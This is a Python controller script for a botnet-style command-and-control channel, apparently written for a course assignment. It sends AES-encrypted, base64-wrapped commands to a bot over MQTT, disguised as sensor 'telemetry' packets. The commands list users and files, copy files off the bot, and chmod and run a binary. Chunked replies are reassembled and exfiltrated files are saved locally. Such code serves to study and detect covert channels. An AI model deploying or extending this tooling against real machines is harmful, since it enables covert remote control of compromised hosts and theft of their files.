import base64
import json
import time
import paho.mqtt.client as mqtt
from consts import *
from utils import encrypt_payload_AES_then_b64, decrypt_payload
import threading
response_event = threading.Event()
# global buffer for reassembling broken up chunks
chunk_buffer = {}
# This runs whenever the bot sends a response back to the 'sensors' topic
def on_message(client, userdata, msg):
    try:
        packet = json.loads(msg.payload.decode())
        if packet.get("s_id") == BOT_ID:
            encrypted_payload = packet.get(DATA_KEY)
            raw_res = decrypt_payload(encrypted_payload)

            # is this a chunked message?
            if raw_res.startswith("CHK:"):
                full_msg = handle_fragment(raw_res)
                # If handle_fragment returns a string,
                # then reconstruction is complete
                if full_msg:
                    if "FILE_B64:" in full_msg:
                        # file transfer logic
                        save_file_from_message(full_msg)
                    else:
                        # regular message
                        print(f"\n[RESPONSE]: {full_msg}")
                        print("> ", end="", flush=True)
                    # unlock main thread
                    response_event.set()
            else:
                response_event.set()
                # Handle non-chunked messages (if any)
                print(f"[RESPONSE]: {raw_res}")

    except:
        pass


def save_file_from_message(raw_res):
    try:
        _, filename, b64data = raw_res.split(":", 2)
        with open(f"copied_{filename}", "wb") as f:
            f.write(base64.b64decode(b64data))
        print(f"[SYSTEM]: Successfully copied file: {filename}, saved as copied_{filename}")
    except Exception as e:
        print(f"[SYSTEM]: Error decoding binary file: {e}")


def create_controller_packet(encrypted_b64_payload):
    packet = {
        "s_id": CONTROLLER_ID,
        "type": "telemetry",
        DATA_KEY: encrypted_b64_payload
    }
    return packet


def handle_fragment(raw_res):
    try:
        _, current, total, data = raw_res.split(":", 3)
        current, total = int(current), int(total)

        # Store fragment
        if "data" not in chunk_buffer:
            chunk_buffer["data"] = [""] * total

        chunk_buffer["data"][current-1] = data

        print(f"[*] Received chunk {current}/{total}...")

        # See if complete
        if all(chunk_buffer["data"]):
            full_msg = "".join(chunk_buffer["data"])
            chunk_buffer.clear() # Reset for next command
            return full_msg
        return None
    except:
        print("[SYSTEM]: Error handling fragment.")
        return None


def timeout_message():
    if not response_event.wait(timeout=30):
        print(f"[TIMEOUT]: No response for {test}")


if __name__ == '__main__':
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    client.connect(BROKER, PORT)
    client.subscribe(TOPIC)
    # loop_start() required over loop_forever() to allow sending commands
    client.loop_start()
    print("Controller is ready. Type a command (e.g., 'id', 'w', 'ping'):")
    try:
        while True:
            cmd = input("> ")
            if cmd.lower() == "exit":
                break

            if cmd == "testall":
                print("Testing all Requirements...")
                test_suite = [
                    CMD_ANNOUNCE_BOT, # botStatus, requirement 5.1
                    CMD_WHO_IS_LOGGED_IN, # w, requirement 5.2
                    CMD_LIST_FILES, # ls, requirement 5.3
                    CMD_ID_HOST, # id, requirement 5.4
                    CMD_COPY_FROM_BOT_TO_CONTROLLER + " fileToCopy.txt",  # requirement 5.5
                    CMD_COPY_FROM_BOT_TO_CONTROLLER + " chunking_test.txt",  # check if chunking works for large files
                    CMD_CHMOD_TEST_BINARY, # requirement 5.6
                    CMD_RUN_TEST_BINARY # requirement 5.6
                ]

                for test in test_suite:
                    print(f"[*] Testing: {test}")
                    response_event.clear()
                    encrypted_b64_payload = encrypt_payload_AES_then_b64(test)
                    packet = create_controller_packet(encrypted_b64_payload)
                    client.publish(TOPIC, json.dumps(packet))
                    print("----")
                    print(f"[DEBUG]: showcase of the hidden packet being sent:")
                    print(json.dumps(packet, indent=4))
                    print("----")

                    timeout_message()
                continue

            encrypted_b64_payload = encrypt_payload_AES_then_b64(cmd)
            # hide data in base64
            packet = create_controller_packet(encrypted_b64_payload)

            print("----")
            print(f"[DEBUG]: showcase of the hidden packet being sent:")
            print(json.dumps(packet, indent=4))
            print("----")

            response_event.clear()
            # send the data hidden within a json packet
            client.publish(TOPIC, json.dumps(packet))
            timeout_message()
    except KeyboardInterrupt:
        pass

    client.loop_stop()
    client.disconnect()

